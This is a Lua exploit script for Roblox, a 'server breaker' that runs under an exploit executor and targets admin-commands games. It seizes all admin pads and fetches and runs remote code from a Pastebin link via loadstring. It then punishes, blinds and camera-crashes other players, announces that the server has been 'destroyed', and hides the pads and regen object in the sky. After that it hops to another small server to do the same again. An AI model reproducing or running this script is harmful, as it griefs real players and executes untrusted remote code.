-- // Don't know what else to say here other then Enjoy. Also removed my webhook for security reasons.
-- // Feel free to edit to your liking, also added notes for support.


local logo =
    [[
    ___  ________  _________  ___  ___  ________   ________   ___  ___  _______   ___  _____ ______      
   |\  \|\   __  \|\___   ___\\  \|\  \|\   ___  \|\   ___  \|\  \|\  \|\  ___ \ |\  \|\   _ \  _   \    
   \ \  \ \  \|\  \|___ \  \_\ \  \\\  \ \  \\ \  \ \  \\ \  \ \  \\\  \ \   __/|\ \  \ \  \\\__\ \  \   
 __ \ \  \ \  \\\  \   \ \  \ \ \  \\\  \ \  \\ \  \ \  \\ \  \ \   __  \ \  \_|/_\ \  \ \  \\|__| \  \  
|\  \\_\  \ \  \\\  \   \ \  \ \ \  \\\  \ \  \\ \  \ \  \\ \  \ \  \ \  \ \  \_|\ \ \  \ \  \    \ \  \ 
\ \________\ \_______\   \ \__\ \ \_______\ \__\\ \__\ \__\\ \__\ \__\ \__\ \_______\ \__\ \__\    \ \__\
 \|________|\|_______|    \|__|  \|_______|\|__| \|__|\|__| \|__|\|__|\|__|\|_______|\|__|\|__|     \|__|
                                                                                                                                                                                                                                                     
 ]]

repeat
    wait()
until game.Players.LocalPlayer.Character -- // Waits for LocalPlayer to load

repeat
    wait()
until game.Workspace.Terrain["_Game"].Admin -- // Waits for Admin respitory to load

local function chat(msg)
    game.Players:Chat(msg)
end

local ispads = false -- // Will be used to check for Pads

coroutine.wrap( -- This is to hook rconsole output functions to normal output functions
    function()
        rconsolename("Jotunnheim V.1 Server Breaker Console") 
        hookfunction(
            print,
            function(a)
                rconsoleprint(a .. "\n")
            end
        )
        hookfunction(
            error,
            function(a)
                rconsoleerr(a .. "\n")
            end
        )
        hookfunction(
            warn,
            function(a)
                rconsolewarn(a .. "\n")
            end
        )
        getgenv().info = function(a)
            rconsoleinfo(a .. "\n")
        end
        warn("Loaded Debug Console/.")
        error("Welcome " .. game.Players.LocalPlayer.Name)
    end
)()


local plr = game.Players.LocalPlayer

local function hop() -- Pretty self explanatory, serverhopper
    while true do
        local sameservers = false
        local http = game:GetService "HttpService"
        local function jsond(str)
            return http:JSONDecode(str)
        end

        local response
        local suc, er =
            pcall(
            function()
                local req =
                    game:HttpGet("https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100")
                response = game:GetService("HttpService"):JSONDecode(req)
            end
        )
        if suc and response then
            for _, server in pairs(response.data) do
                if game.JobId ~= server.id then -- / You don't want to rejoin the same server.
                    if server.playing <= 5 then
                        warn("Hopping Servers...")
                        warn("Found Server!")
                        rconsoleerr("Server Id: " .. server.id)
                        rconsoleerr("Players Playing: " .. server.playing)
                        rconsoleerr("Server Ping: " .. server.ping)
                        print("")
                        print("")
                        print("-------------------------------------------------------------------------------------------------------")
                        print("")
                        print(logo)
                        print("")
                        print("-------------------------------------------------------------------------------------------------------")
                        print("")
                        print("")
                        game:GetService("TeleportService"):TeleportToPlaceInstance(
                            game.PlaceId,
                            server.id,
                            game:GetService("Players").LocalPlayer
                        )
                        break
                    end
                end
            end
        elseif er then -- Outputs HTTP request Errors
            print(er)
            tp()
        else
            print("http returned nil")
            tp()
        end
        wait(.5)
    end
end



if not game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen") then -- Checks if Regen exists
    error("This Server has already been Destroyed, Breaking Camera Because Why The Fuck Not")
    chat("gear all 0004842207161") -- break camera
    hop()
else
    if game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen").CFrame.Y > 500 then -- Checks if Regen's CFrame.Y is below 500
        error("This Server has already been Destroyed, Breaking Camera Because Why The Fuck Not")
    chat("gear all 0004842207161") -- break camera
        hop()
    else
        for _, pads in pairs(game.Workspace.Terrain["_Game"].Admin.Pads:GetDescendants()) do -- Checks if Pads exist
            if pads:IsA("Part") then
                ispads = true
            end
        end
        if not ispads then
            error("This Server has already been Destroyed, Breaking Camera Because Why The Fuck Not")
    chat("gear all 0004842207161") -- break camera
            hop()
        else
        
        -- Variables:
        local plrs = game:GetService("Players")
        local http = game:GetService "HttpService"
        local plr = plrs.LocalPlayer
        local Pads = game.Workspace.Terrain["_Game"].Admin.Pads
        local regen = game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen")
        local time = 0.0000000000000000000001
        local nm = plr.Name
        local gid = game.JobId
        local ch = plr.Character
        local rs = game:getService("RunService")
            

        fireclickdetector(regen.ClickDetector, 0) -- Grabs all pads
        wait(.1)
        coroutine.wrap(
            function()
                while true do
                    task.wait(time)
                    for i, v in pairs(Pads:GetChildren()) do
                        firetouchinterest(plr.Character:WaitForChild("Head"), v.Head, 0)
                        firetouchinterest(plr.Character:WaitForChild("Head"), v.Head, 1)
                    end
                end
            end
        )()

        warn("Grabbed All Pads Successfully!")

        local function chat(msg) -- // Chat function
            game.Players:Chat(msg)
        end

       
        pcall(function()
        loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, extra checks to make sure you have admin
        end)
        wait(time)
        chat("respawn others")
        wait()
        chat("punish others")
        chat("blind others")
        chat("gear all 0004842207161")
        chat("logs")
        if _G.Notify then
            local l =
                [[This Server Has Been Destroyed By 794x794, All Admin Has Been Compromised. 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ]]
            chat("m " .. l)
        end
         warn("Players have been punished, Removing Pads")

        wait()

        chat(".pads")
            
            
            
            

        for i, v in pairs(Pads:GetChildren()) do -- // Moves Pads to the sky
            repeat
                wait()

                repeat
                    wait()
                until game.Players.LocalPlayer.Character and
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

                local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local looping = true

                spawn(
                    function()
                        while true do
                            game:GetService("RunService").Heartbeat:Wait()
                            game.Players.LocalPlayer.Character["Humanoid"]:ChangeState(11)
                            cf.CFrame =
                                v.Head.CFrame *
                                CFrame.new(
                                    -1 * (v.Head.Size.X / 2) - (game.Players.LocalPlayer.Character["Torso"].Size.X / 2),
                                    0,
                                    0
                                )
                            if not looping then
                                break
                            end
                        end
                    end
                )
                spawn(
                    function()
                        while looping do
                            wait(.1)
                            chat("unpunish me")
                        end
                    end
                )
                wait(0.3)
                looping = false
                for i = 1, 5 do
                    chat("skydive me")
                    chat("skydive me")
                    chat("skydive me")
                end
                wait(0.2)
                chat("respawn me")
                wait(0.2)
            until v.Head.CFrame.Y > 500
        end

        warn("Pads have been removed! Moving Regen..")


        repeat -- // Moves regen to the sky
            wait()
        until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local looping = true
        spawn(
            function()
                while true do
                    game:GetService("RunService").Heartbeat:Wait()
                    game.Players.LocalPlayer.Character["Humanoid"]:ChangeState(11)
                    cf.CFrame =
                        regen.CFrame *
                        CFrame.new(
                            -1 * (regen.Size.X / 2) - (game.Players.LocalPlayer.Character["Torso"].Size.X / 2),
                            0,
                            0
                        )
                    if not looping then
                        break
                    end
                end
            end
        )
        spawn(
            function()
                while looping do
                    wait(.1)
                    chat("unpunish me")
                end
            end
        )
        wait(0.3)
        looping = false
        for i = 1, 5 do
            chat("skydive me")
            chat("skydive me")
            chat("skydive me")
        end
        wait(0.2)
        chat("respawn me")
        wait(0.2)

        warn("Regen Has Been Moved Successfully!")
        wait(.1)
        hop()
    end
end
end
